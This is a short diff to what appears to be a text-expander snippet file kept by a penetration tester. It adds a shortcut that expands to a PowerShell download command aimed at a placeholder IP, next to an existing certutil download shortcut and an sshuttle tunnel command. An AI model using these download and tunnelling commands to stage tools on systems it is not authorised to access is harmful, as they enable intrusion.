@@ -152,6 +152,9 @@ matches:
   - trigger: ":certutil"
     replace: certutil.exe -urlcache -split -f http://{{IP}}/
 
+  - trigger: ":iwr"
+    replace: iwr -uri http://{{IP}}/ -Outfile
+
 # SSH Tunneling
   - trigger: ":sshuttle"
     replace: sshuttle -r user@{{clipboard}} 10.10.10.0/24 —ssh-cmd “ssh -i id_rsa”
